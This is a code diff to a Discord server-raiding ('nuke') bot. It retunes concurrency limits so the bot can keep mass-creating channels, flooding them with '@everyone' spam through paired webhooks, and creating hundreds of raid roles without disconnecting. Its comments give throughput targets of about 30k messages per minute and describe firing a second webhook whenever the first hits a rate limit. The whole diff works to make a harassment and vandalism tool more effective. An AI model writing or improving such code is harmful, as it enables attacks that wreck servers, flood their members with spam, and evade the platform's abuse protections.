@@ -36,12 +36,17 @@ RAID_GIF    = "https://cdn.discordapp.com/attachments/827289915388985404/1493954
 CHANNEL_CAP      = 490
 CREATORS         = 5
 ROLE_FLOOD_MAX   = 200
-SPAM_BURST       = 5    # messages sent per semaphore slot acquisition
+SPAM_BURST       = 3    # messages per semaphore slot (3 × 25 slots = 75 concurrent channel sends)
 CREATE_PER_CYCLE = 100  # channels built per nuke cycle (100 ch × 5 msg/s = 500/s = 30k/min)
-WEBHOOKS_PER_CH  = 2    # 2 webhooks per channel — when one hits 429 and sleeps, other fires
+WEBHOOKS_PER_CH  = 2    # 2 webhooks per channel — when one hits 429, other fires
 
-_SPAM_SEM = asyncio.Semaphore(50)
-_WH_SEM   = asyncio.Semaphore(30)
+# Hard caps on concurrent HTTP requests.
+# Without these, 200 unconstrained webhook tasks + 100 channel tasks = 1500 concurrent
+# HTTP requests → event loop starvation → Discord heartbeat dies → bot disconnects →
+# every slash command shows "Application did not respond".
+# With these: 25×3 + 15×3 = 120 max concurrent requests — heartbeat always gets scheduled.
+_SPAM_SEM = asyncio.Semaphore(25)   # controls channel.send tasks
+_WH_SEM   = asyncio.Semaphore(15)   # controls wh.send tasks (was defined but never used — root cause)
 
 _MSGS = [
     f"@everyone 💀 **{RAID_NAME}** 💀 {RAID_LINK}",
@@ -399,22 +404,25 @@ class Raid(commands.Cog):
         mentions = discord.AllowedMentions(everyone=True, roles=True)
 
         while not se.is_set():
-            try:
-                results = await asyncio.gather(
-                    *[wh.send(_msg(), username=random.choice(_WH_NAMES), allowed_mentions=mentions)
-                      for _ in range(SPAM_BURST)],
-                    return_exceptions=True,
-                )
-                for r in results:
-                    if isinstance(r, (discord.NotFound, discord.Forbidden)):
-                        return
-                    if isinstance(r, discord.HTTPException) and r.status == 429:
-                        await asyncio.sleep(float(getattr(r, "retry_after", 1.0)))
-            except (discord.NotFound, discord.Forbidden):
-                return
-            except Exception:
-                return
-            await asyncio.sleep(0.05)
+            async with _WH_SEM:   # ← was missing — this was the "Application did not respond" root cause
+                if se.is_set():
+                    return
+                try:
+                    results = await asyncio.gather(
+                        *[wh.send(_msg(), username=random.choice(_WH_NAMES), allowed_mentions=mentions)
+                          for _ in range(SPAM_BURST)],
+                        return_exceptions=True,
+                    )
+                    for r in results:
+                        if isinstance(r, (discord.NotFound, discord.Forbidden)):
+                            return
+                        if isinstance(r, discord.HTTPException) and r.status == 429:
+                            await asyncio.sleep(float(getattr(r, "retry_after", 1.0)))
+                except (discord.NotFound, discord.Forbidden):
+                    return
+                except Exception:
+                    return
+            await asyncio.sleep(0.1)
 
     # ─────────────────────────────────────────────────────────────────────────
     # ROLE FLOOD — create 200 raid roles concurrently
